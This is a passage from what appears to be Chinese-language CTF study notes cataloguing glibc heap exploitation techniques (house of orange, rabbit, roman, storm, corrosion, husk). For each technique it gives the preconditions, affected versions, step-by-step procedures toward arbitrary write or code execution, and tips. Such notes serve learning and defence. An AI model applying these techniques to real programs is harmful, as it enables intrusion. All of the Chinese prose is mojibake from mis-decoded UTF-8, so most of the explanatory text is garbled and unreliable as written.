<code>B</code> è¿›å…¥ <code>smallbin</code></li><li>å†™ <code>A</code>ï¼Œæº¢å‡ºä¿®æ”¹ <code>B</code> çš„ <code>bk</code>ï¼ŒæŒ‡å‘åœ°å€ <code>X</code>ï¼Œè¿™é‡Œæœ‰ <code>fake chunk</code></li><li>å¸ƒç½® <code>X-&gt;fd == &amp;B</code></li><li>åˆ†é…ä¸¤æ¬¡åå³å¯å–å‡ºä½äº <code>X</code> åœ°å€å¤„çš„ <code>fake chunk</code></li></ul><h3 id="ç›¸å…³æŠ€å·§-3"><a href="#ç›¸å…³æŠ€å·§-3" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p>åœ¨å¼•å…¥äº† <code>tcache stash unlink</code> çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„ç»•è¿‡ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = <span class="built_in">csize2tidx</span> (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = <span class="built_in">last</span> (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      <span class="built_in">set_inuse_bit_at_offset</span> (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line"><span class="built_in">set_non_main_arena</span> (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">tcache_put</span> (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>è¦ä¹ˆä½¿å…¶æ»¡è¶³ <code>tc_victim = last (bin)) == bin</code>ã€è¦ä¹ˆä½¿å…¶æ»¡è¶³ï¼š<code>tcache-&gt;counts[tc_idx] â‰¥ mp_.tcache_count</code>ã€‚å¦åˆ™å¯èƒ½ä¼šå› ä¸ºéæ³•å†…å­˜è®¿é—®ä½¿å¾—ç¨‹åº <code>down</code> æ‰ã€‚(<strong>å¯¹åº”tcacheä¸ºç©ºæˆ–è€…æ»¡</strong>)</p><p>å®é™…ä¸Šï¼Œè¿™ä¸ªæŠ€å·§ç”¨å¾—ä¸æ˜¯å¾ˆå¤šï¼Œå› ä¸ºåœ¨åŒç­‰æ¡ä»¶ä¸‹ï¼Œæ›´åå‘äºåˆ©ç”¨ <code>fastbin/tcachebin</code>ã€‚</p><h3 id="åˆ©ç”¨æ•ˆæœ-3"><a href="#åˆ©ç”¨æ•ˆæœ-3" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€åˆ†é…</li><li>ä»»æ„åœ°å€è¯»å†™</li></ul><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><h3 id="æ¼æ´æˆå› -4"><a href="#æ¼æ´æˆå› -4" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºå†™</p><h3 id="é€‚ç”¨èŒƒå›´-4"><a href="#é€‚ç”¨èŒƒå›´-4" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€”<code>2.26</code></li><li><strong>æ²¡æœ‰ <code>free</code></strong></li><li>å¯ä»¥ <code>unsortedbin attack</code></li></ul><h3 id="åˆ©ç”¨åŸç†-4"><a href="#åˆ©ç”¨åŸç†-4" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p><code>house of orange</code> å¯ä»¥è¯´æ˜¯å¼€å¯äº†å †ä¸ <code>IO</code> ç»„åˆåˆ©ç”¨çš„å…ˆæ²³ï¼Œæ˜¯éå¸¸ç»å…¸ã€æ¼‚äº®ã€ç²¾å½©çš„åˆ©ç”¨ç»„åˆæŠ€ã€‚åˆ©ç”¨è¿‡ç¨‹è¿˜è¦ç»“åˆ <code>top_chunk</code> çš„æ€§è´¨ï¼Œåˆ©ç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p><strong>stage1</strong></p><ul><li>ç”³è¯· <code>chunk A</code>ï¼Œå‡è®¾æ­¤æ—¶çš„ <code>top_chunk</code> çš„ <code>size</code> ä¸º <code>0xWXYZ</code></li><li>å†™ <code>A</code>ï¼Œæº¢å‡ºä¿®æ”¹ <code>top_chunk</code> çš„ <code>size</code> ä¸º <code>0xXYZ</code>ï¼ˆéœ€è¦æ»¡è¶³é¡µå¯¹é½çš„æ£€æµ‹æ¡ä»¶ï¼‰</li><li>ç”³è¯·ä¸€ä¸ªå¤§äº <code>0xXYZ</code> å¤§å°çš„ <code>chunk</code>ï¼Œæ­¤æ—¶ <code>top_chunk</code> ä¼šè¿›è¡Œ <code>grow</code>ï¼Œå¹¶å°†åŸæ¥çš„ <code>old top_chunk</code> é‡Šæ”¾è¿›å…¥ <code>unsortedbin</code></li></ul><p><strong>stage2</strong></p><ul><li>æº¢å‡ºå†™ <code>A</code>ï¼Œä¿®æ”¹å¤„äº <code>unsortedbin</code> ä¸­çš„ <code>old top_chunk</code>ï¼Œä¿®æ”¹å…¶ <code>size</code> ä¸º <code>0x61</code>ï¼Œå…¶ <code>bk</code> ä¸º <code>&amp;_IO_list_all-0x10</code>ï¼ŒåŒæ—¶ä¼ªé€ å¥½ <code>IO_FILE</code> ç»“æ„</li><li>ç”³è¯·é <code>0x60</code> å¤§å°çš„ <code>chunk</code> çš„æ—¶å€™ï¼Œé¦–å…ˆè§¦å‘ <code>unsortedbin attack</code>ï¼Œå°†<code>_IO_list_all</code> ä¿®æ”¹ä¸º <code>main_arena+88</code>ï¼Œç„¶å <code>unsortedbin chunk</code> ä¼šè¿›å…¥åˆ° <code>smallbin</code>ï¼Œå¤§å°ä¸º <code>0x60</code>ï¼›æ¥ç€éå† <code>unsortedbin</code> çš„æ—¶å€™è§¦å‘äº† <code>malloc_printerr</code>ï¼Œç„¶åè°ƒç”¨é“¾ä¸ºï¼š<code> malloc_printerr -&gt; libc_message -&gt; abort -&gt; _IO_flush_all_lockp</code>ï¼Œè°ƒç”¨åˆ°ä¼ªé€ çš„ <code>vtable</code> é‡Œé¢çš„å‡½æ•°æŒ‡é’ˆï¼ˆä¹Ÿå¯ä»¥exitè°ƒç”¨ä¹‹ç±»çš„ï¼Œæ„Ÿè§‰ä¸ä¸€å®šå±€é™äº<code>malloc_printerr</code>ï¼‰</li></ul><h3 id="ç›¸å…³æŠ€å·§-4"><a href="#ç›¸å…³æŠ€å·§-4" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>åœ¨ <code>glibc-2.24</code> ååŠ å…¥äº† <code>vtable</code> çš„ <code>check</code>ï¼Œä¸èƒ½ä»»æ„åœ°å€ä¼ªé€  <code>vatble</code> äº†ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨ <code>IO_str_jumps</code> ç»“æ„è¿›è¡Œåˆ©ç”¨ã€‚</li><li>åœ¨ <code>glibc-2.26</code> åï¼Œ<code>malloc_printerr</code> ä¸å†åˆ·æ–° <code>IO</code> æµäº†ï¼Œæ‰€ä»¥è¯¥æ–¹æ³•å¤±æ•ˆ</li><li>ç”±äº<code>_mode</code> çš„æ­£è´Ÿæ€§æ˜¯éšæœºçš„ï¼Œå½±å“åˆ¤æ–­æ¡ä»¶ï¼Œå¤§æ¦‚æœ‰ <code>1/2</code> çš„æ¦‚ç‡ä¼šåˆ©ç”¨å¤±è´¥ï¼Œå¤šè¯•å‡ æ¬¡å°±å¥½</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-4"><a href="#åˆ©ç”¨æ•ˆæœ-4" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„å‡½æ•°æ‰§è¡Œ</li><li>ä»»æ„å‘½ä»¤æ‰§è¡Œ</li></ul><h2 id="house-of-rabbit"><a href="#house-of-rabbit" class="headerlink" title="house of rabbit"></a>house of rabbit</h2><h3 id="æ¼æ´æˆå› -5"><a href="#æ¼æ´æˆå› -5" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºå†™ã€<code>use after free</code>ã€<code>edit after free</code></p><h3 id="é€‚ç”¨èŒƒå›´-5"><a href="#é€‚ç”¨èŒƒå›´-5" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€”<code>2.26</code></li><li>è¶…è¿‡ <code>0x400</code> å¤§å°çš„å †åˆ†é…</li><li>å¯ä»¥å†™ <code>fastbin</code> çš„ <code>fd</code> æˆ–è€… <code>size</code> åŸŸ</li></ul><h3 id="åˆ©ç”¨åŸç†-5"><a href="#åˆ©ç”¨åŸç†-5" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>è¯¥åˆ©ç”¨æŠ€å·§çš„æ ¸å¿ƒæ˜¯ <code>malloc_consolidate</code> å‡½æ•°ï¼Œå½“æ£€æµ‹åˆ°æœ‰ <code>fastbin</code> çš„æ—¶å€™ï¼Œä¼šå–å‡ºæ¯ä¸€ä¸ª <code>fastbin chunk</code>ï¼Œå°†å…¶æ”¾ç½®åˆ° <code>unsortedbin</code> ä¸­ï¼Œå¹¶è¿›è¡Œåˆå¹¶ã€‚ä»¥ä¿®æ”¹ <code>fd</code> ä¸ºä¾‹ï¼Œåˆ©ç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ç”³è¯· <code>chunk A</code>ã€<code>chunk B</code>ï¼Œå…¶ä¸­ <code>chunk A</code> çš„å¤§å°ä½äº <code>fastbin</code> èŒƒå›´</li><li>é‡Šæ”¾ <code>chunk A</code>ï¼Œä½¿å…¶è¿›å…¥åˆ° <code>fastbin</code></li><li>åˆ©ç”¨ <code>use after free</code>ï¼Œä¿®æ”¹ <code>A-&gt;fd</code> æŒ‡å‘åœ°å€ <code>X</code>ï¼Œéœ€è¦ä¼ªé€ å¥½ <code>fake chunk</code>ï¼Œä½¿å…¶ä¸æ‰§è¡Œ <code>unlink</code> æˆ–è€…ç»•è¿‡ <code>unlink</code></li><li>åˆ†é…è¶³å¤Ÿå¤§çš„ <code>chunk</code>ï¼Œæˆ–è€…é‡Šæ”¾ <code>0x10000</code> ä»¥ä¸Šçš„ <code>chunk</code>ï¼Œåªè¦èƒ½è§¦å‘ <code>malloc_consolidate</code> å³å¯</li><li>æ­¤æ—¶ <code>fake chunk</code> è¢«æ”¾åˆ°äº† <code>unsortedbin</code>ï¼Œæˆ–è€…è¿›å…¥åˆ°å¯¹åº”çš„ <code>smallbin/largebin</code></li><li>å–å‡º <code>fake chunk</code> è¿›è¡Œè¯»å†™å³å¯</li></ul><h3 id="ç›¸å…³æŠ€å·§-5"><a href="#ç›¸å…³æŠ€å·§-5" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li><code>2.26</code> åŠ å…¥äº† <code>unlink</code> å¯¹ <code>presize</code> çš„æ£€æŸ¥</li><li><code>2.27</code> åŠ å…¥äº† <code>fastbin</code> çš„æ£€æŸ¥</li></ul><p>æŠ“ä½é‡ç‚¹ï¼š<code>house of rabbit</code> æ˜¯å¯¹ <code>malloc_consolidate</code> çš„åˆ©ç”¨ã€‚å› æ­¤ï¼Œä¸ä¸€å®šè¦æŒ‰ç…§åŸä½œè€…çš„æ€è·¯æ¥ï¼Œä»–çš„æ€è·¯éœ€è¦æ»¡è¶³çš„æ¡ä»¶å¤ªå¤šäº†ã€‚</p><h3 id="åˆ©ç”¨æ•ˆæœ-5"><a href="#åˆ©ç”¨æ•ˆæœ-5" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€åˆ†é…</li><li>ä»»æ„åœ°å€è¯»å†™</li></ul><h2 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house of roman"></a>house of roman</h2><h3 id="æ¼æ´æˆå› -6"><a href="#æ¼æ´æˆå› -6" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p><code>use after free</code>ã€å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-6"><a href="#é€‚ç”¨èŒƒå›´-6" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€”<code>2.29</code></li><li>å¯ä»¥ <code>use after edit</code></li><li>ä¸éœ€è¦æ³„éœ²åœ°å€</li><li>éœ€è¦éƒ¨åˆ†å­—èŠ‚</li></ul><h3 id="åˆ©ç”¨åŸç†-6"><a href="#åˆ©ç”¨åŸç†-6" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><ul><li><p>ç”³è¯·chunkAï¼ŒchunkBï¼ŒchunkCï¼ŒchunkDï¼ŒchunkEï¼Œå…¶ä¸­chunkBçš„å¤§å°ä¸º0xd0</p></li><li><p>åœ¨chunkBä¸­å†™å…¥<code>&quot;A&quot;*0x68+p64(0x61)</code></p></li><li><p>é‡Šæ”¾æ‰Bï¼ŒBè¿›å…¥unsortedbinï¼Œç„¶åchunkAæº¢å‡ºä¿®æ”¹chunkBçš„sizeä¸º0x71ï¼Œæ­¤æ—¶chunkBçš„fdå’Œbkéƒ½æ˜¯main_arena+88</p></li><li><p>ç„¶åå°†chunkDå’ŒchunkEéƒ½é‡Šæ”¾è¿›fastbinä¸­ï¼ŒsizeåŸŸä¸º0x70çš„</p></li><li><p>ç„¶ååˆ©ç”¨uaféƒ¨åˆ†åœ°å€å†™ï¼Œå°†chunkBä¼ªé€ çš„chunké“¾å…¥fastbinä¸­</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x70: <span class="number">0</span>x555555757160 â€”â–¸ <span class="number">0</span>x555555757020 â€”â–¸ <span class="number">0</span>x7ffff7dd1b78 (main_arena+<span class="number">88</span>) â—‚â€” <span class="number">0</span>x7ffff7dd1b78</span><br></pre></td></tr></table></figure></li><li><p>ç„¶åä¿®æ”¹chunkBçš„fdçš„ä½2å­—èŠ‚ï¼Œä½¿B-&gt;fd&#x3D; malloc_hook - 0x23</p></li><li><p>ç„¶ååˆ†é…3ä¸ªchunkçš„sizeä¸º0x70çš„å°±èƒ½è·å¾—è¿™ä¸ªfake chunkäº†</p></li><li><p>ç„¶ååœ¨ä¹‹å‰å°±è¦å¤šåˆ†é…ä¸€ä¸ª0x70å¤§å°çš„chunkæ­¤æ—¶æ¥é€šè¿‡uafä¿®å¤fastbinï¼ˆæ³¨æ„å †é£æ°´ï¼‰</p></li><li><p>ä¹‹åé€šè¿‡unsortedbin attackæ¥ä¿®æ”¹malloc_hookä¸ºä¸€ä¸ªlibcbase+0xXXXX</p></li><li><p>ä¹‹åéƒ¨åˆ†å†™malloc_hookçš„ä½å­—èŠ‚ä½¿å…¶åå‘onegadgetï¼Œéœ€è¦çˆ†ç ´</p></li></ul><h3 id="ç›¸å…³æŠ€å·§-6"><a href="#ç›¸å…³æŠ€å·§-6" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>ä½¿ç”¨ <code>house of roman</code> çš„æ—¶å€™ï¼Œéœ€è¦é‡‡ç”¨å¤šçº¿ç¨‹çˆ†ç ´</li><li>å¯ä»¥ä½¿ç”¨å…¶ä»–æ–¹æ³•ä»£æ›¿ï¼Œæ¯”å¦‚å…ˆæ”»å‡» <code>stdout</code> æ³„éœ²åœ°å€ï¼Œä½¿å¾—çˆ†ç ´çš„æˆæœ¬é™ä½</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-6"><a href="#åˆ©ç”¨æ•ˆæœ-6" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>æ‰§è¡Œ <code>one_gadget</code></li><li>ç»•è¿‡ <code>ASLR</code></li></ul><h2 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h2><h3 id="æ¼æ´æˆå› -7"><a href="#æ¼æ´æˆå› -7" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºã€<code>use after free</code>ã€<code>edit after free</code></p><h3 id="é€‚ç”¨èŒƒå›´-7"><a href="#é€‚ç”¨èŒƒå›´-7" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€”<code>2.28</code> å› ä¸º2.29çš„unsortedbin attackå¤±æ•ˆ</li><li>å¯ä»¥è¿›è¡Œ <code>unsortedbin attack</code></li><li>å¯ä»¥è¿›è¡Œ <code>largebin attack</code>ï¼Œä¿®æ”¹ <code>bk</code> å’Œ <code>bk_nextsize</code></li><li>å¯ä»¥åˆ†é… <code>0x50</code> å¤§å°çš„ <code>chunk</code></li></ul><h3 id="åˆ©ç”¨åŸç†-7"><a href="#åˆ©ç”¨åŸç†-7" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p><code>house of storm</code> ä¹Ÿæ˜¯ä¸€æ¬¾ç»„åˆæŠ€ï¼Œåˆ©ç”¨å¼€å¯äº† <code>PIE</code> çš„ <code>x64</code> ç¨‹åºçš„å †åœ°å€æ€»æ˜¯ <code>0x55xxxx...</code> æˆ–è€… <code>0x56xxxx...</code> å¼€å¤´è¿™ä¸€ç‰¹æ€§ï¼Œä½¿ç”¨ä¸€æ¬¡ <code>largebin attack</code> å†™ä¸¤ä¸ªå †åœ°å€ï¼Œä½¿ç”¨ä¸€æ¬¡ <code>unsortedbin attack</code> å†™ä¸€æ¬¡ <code>libc</code> åœ°å€ï¼Œå¯ä»¥å®ç°ä»»æ„åœ°å€åˆ†é…ã€‚è™½ç„¶ <code>house of storm</code> æœ€åèƒ½è¾¾åˆ°ä»»æ„åœ°å€åˆ†é…ï¼Œä½†æ˜¯ç”±äºå…¶æ‰€éœ€çš„æ¡ä»¶æ¯”è¾ƒå¤šï¼Œä¸€èˆ¬å¯ä»¥ç”¨å…¶ä»–æ›´ç®€ä¾¿çš„å †åˆ©ç”¨æŠ€æœ¯ä»£æ›¿ã€‚åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>è¿›è¡Œä¸€æ¬¡ <code>unsortedbin attack</code>ï¼Œå…¶ <code>bk</code> ä¿®æ”¹ä¸º <code>addr</code></li><li>è¿›è¡Œä¸€æ¬¡ <code>largebin attack</code>ï¼Œå…¶ <code>bk</code> ä¿®æ”¹ä¸º <code>addr+0x10</code>ï¼Œ<code>bk_nextsize</code> ä¿®æ”¹ä¸º <code>addr-0x20+3</code></li><li>ç”³è¯· <code>0x50</code> å¤§å°çš„ <code>chunk</code> å³å¯ç”³è¯·åˆ° <code>addr</code> å¤„</li></ul><h3 id="ç›¸å…³æŠ€å·§-7"><a href="#ç›¸å…³æŠ€å·§-7" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p>éœ€è¦æ³¨æ„çš„æœ‰ï¼š</p><ul><li>è¯¥æ–¹æ³•æˆåŠŸçš„å‡ ç‡æ˜¯ <code>50%</code>ï¼Œå› ä¸º <code>0x55</code> ä¼šè§¦å‘ <code>assert</code> æ–­è¨€ï¼Œ<code>0x56</code> æ‰èƒ½æˆåŠŸ</li><li>ç”³è¯· <code>addr</code> å¤„çš„ <code>chunk</code> çš„æ—¶å€™éœ€è¦ä» <code>unsortedbin</code> é‡Œé¢å–</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-7"><a href="#åˆ©ç”¨æ•ˆæœ-7" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€åˆ†é…</li></ul><h2 id="house-of-corrosion"><a href="#house-of-corrosion" class="headerlink" title="house of corrosion"></a>house of corrosion</h2><h3 id="æ¼æ´æˆå› -8"><a href="#æ¼æ´æˆå› -8" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºã€<code>use after free</code></p><h3 id="é€‚ç”¨èŒƒå›´-8"><a href="#é€‚ç”¨èŒƒå›´-8" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>ä»»æ„å¤§å°åˆ†é…</li><li>å¯ä»¥ä¿®æ”¹ <code>global_max_fast</code></li><li>ä¸éœ€è¦æ³„éœ²åœ°å€</li></ul><h3 id="åˆ©ç”¨åŸç†-8"><a href="#åˆ©ç”¨åŸç†-8" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>ä¸€ä¸ªéå¸¸ <code>tricky</code> çš„æ–¹æ³•ï¼Œå¯ä»¥ç»•è¿‡ <code>aslr</code>ï¼Œä¸éœ€è¦æ³„éœ²åœ°å€éƒ½èƒ½è¾¾æˆ <code>rce</code>ï¼Œå¯ä»¥å¾ˆå¾ˆå¤šæ–¹æ³•ç»“åˆèµ·æ¥åº”ç”¨ã€‚å…ˆè¯´åˆ©ç”¨åŸç†ï¼š</p><ul><li>ä½¿ç”¨ <code>unsortedbin attack/largebin attack</code> ç­‰æ–¹æ³•ï¼ŒæˆåŠŸä¿®æ”¹ <code>global_max_fast</code> çš„å€¼ä¸ºå¾ˆå¤§çš„å€¼ã€‚å¦‚æœä½¿ç”¨ <code>unsortedbin attack</code>ï¼Œä¸éœ€è¦æ³„éœ²åœ°å€ï¼Œçˆ†ç ´ <code>1/16</code> å³å¯</li><li>ç”³è¯·ä»»æ„å¤§å°çš„ <code>chunk</code>ï¼Œè¿™äº› <code>chunk</code> éƒ½ä¼šè¢«è§†ä¸º <code>fastbin chunk</code>ï¼Œç„¶ååˆ©ç”¨è¿™äº› <code>chunk</code> æ¥è¿›è¡Œè¯»å’Œå†™</li></ul><p>æ­¤æ—¶çš„è®¡ç®—å…¬å¼ä¸ºï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk size = (chunk addr - &amp;main_arena.fastbinsY) x <span class="number">2</span> + <span class="number">0x20</span></span><br></pre></td></tr></table></figure><p><strong>åŸè¯­1ï¼š</strong>ï¼ˆä»»æ„åœ°å€ä»»æ„å†™ï¼‰</p><ul><li><p>å‡å¦‚æˆ‘ä»¬è¦ä¿®æ”¹çš„åœ°å€ä¸º0x2000ä¸Šçš„æ•°æ®ï¼Œæ­¤æ—¶æˆ‘ä»¬çš„main_arena.fatbinsYçš„åœ°å€æ˜¯0x1000</p></li><li><p>è®¡ç®—size&#x3D;(0x2000-0x1000)*2+0x20&#x3D;0x2020ï¼Œæ‰€ä»¥å°±è¦å…ˆäº‹å…ˆchunkA&#x3D;malloc(0x2018)</p></li><li><p>ä¹‹åé€šè¿‡unsortedbin attackæˆ–è€…largebin attackï¼Œæ”¹å†™global_max_fast</p></li><li><p>æ­¤æ—¶freeæ‰äº‹å…ˆåˆ†é…å¥½çš„chunkAï¼Œç›®æ ‡åœ°å€ä¼šæŒ‡å‘A<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218153144362.png" alt="image-20250218153144362" style="zoom:50%;" /></p></li><li><p>é€šè¿‡UAFä¿®æ”¹Açš„fdä¸ºvalueï¼Œ*A&#x3D;value<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218153228419.png" alt="image-20250218153228419" style="zoom: 50%;" /></p></li><li><p>ä¹‹åå†åˆ†é…å›æ¥ï¼Œvalueä¹Ÿå°±æˆåŠŸå†™å…¥å¯¹åº”çš„target_addr</p><img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218153328675.png" alt="image-20250218153328675" style="zoom:50%;" /></li></ul><p><strong>åŸè¯­2ï¼š</strong>ï¼ˆè½¬ç§»å·²ç»å­˜åœ¨çš„å€¼ï¼‰</p><ul><li>é¦–å…ˆå‡è®¾ç›®æ ‡åœ°å€ä¸º0x2000ï¼Œ0x3000ä¸Šå­˜æœ‰ä¸€ä¸ªlibcåœ°å€ï¼ŒfastbinYçš„åœ°å€ä¸º0x1000ï¼Œè®¡ç®—<code>size1=(0x2000-0x1000)*2+0x20=0x2020</code>ï¼Œ<code>size2=(0x3000-0x1000)*2+0x20=0x4020</code></li><li>æ­¤æ—¶åˆ†é…ä¸¤ä¸ªsizeéƒ½ä¸ºsize1çš„chunkAå’ŒchunkBï¼Œå¹¶ä¸”é€šè¿‡unsortedbin attackæˆ–è€…largebin attackæ”¹å†™global_max_fast</li><li>ä¹‹åé‡Šæ”¾æ‰chunkAå’ŒchunkB<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218154308999.png" alt="image-20250218154308999" style="zoom:50%;" /></li><li>é€šè¿‡UAFï¼Œéƒ¨åˆ†å†™chunkAçš„fdä½¿å…¶æŒ‡å‘æœ¬èº«ï¼Œè¾¾åˆ°double freeç±»ä¼¼çš„æ•ˆæœ<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218154357013.png" alt="image-20250218154357013" style="zoom:50%;" /></li><li>å†æŠŠAç»™åˆ†é…å›æ¥ï¼ŒåŒæ—¶ç¯¡æ”¹chunkAçš„sizeä¸ºsize2ï¼Œé‡Šæ”¾æ‰A<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218154440828.png" alt="image-20250218154440828" style="zoom:50%;" /></li><li>å†æ¬¡ç¯¡æ”¹Açš„size,æ¢å¤ä¸ºsize1ï¼Œç„¶åmalloc(size1),å°±æˆåŠŸå®Œæˆsrc-&gt;dstæ•°æ®çš„è½¬ç§»</li></ul><h3 id="ç›¸å…³æŠ€å·§-8"><a href="#ç›¸å…³æŠ€å·§-8" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>è™½ç„¶è‡³ä»Šéƒ½èƒ½ä½¿ç”¨ <code>house of corrosion</code>ï¼Œä½†æ˜¯åœ¨ <code>glibc-2.37</code> ç‰ˆæœ¬ä¸­ï¼Œ<code>global_max_fast</code> çš„æ•°æ®ç±»å‹è¢«ä¿®æ”¹ä¸ºäº† <code>int8_u</code>ï¼Œè¿›è€Œå¯¼è‡´å¯æ§çš„ç©ºé—´èŒƒå›´å¤§å¹…åº¦ç¼©å°ã€‚</li><li><code>house of corrosion</code> ä¹Ÿå¯ä»¥æ‹“å±•åˆ° <code>tcachebin</code> ä¸Š</li><li>é€‚å½“æ§åˆ¶ <code>global_max_fast</code> çš„å¤§å°ï¼ŒæŠŠæ¡æ§åˆ¶çš„ç©ºé—´èŒƒå›´</li><li>å¯ä»¥å’Œ <code>IO_FILE</code> ç»“åˆèµ·æ¥æ³„éœ²ä¿¡æ¯</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-8"><a href="#åˆ©ç”¨æ•ˆæœ-8" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li><code>glibc</code> ä¸Šçš„åœ°å€æ³„éœ²</li><li>æ‰§è¡Œ <code>one_gadget</code></li></ul><h2 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h2><h3 id="æ¼æ´æˆå› -9"><a href="#æ¼æ´æˆå› -9" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-9"><a href="#é€‚ç”¨èŒƒå›´-9" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li>2.23â€“2.35</li><li>åŠ«æŒ <code>__printf_function_table</code> 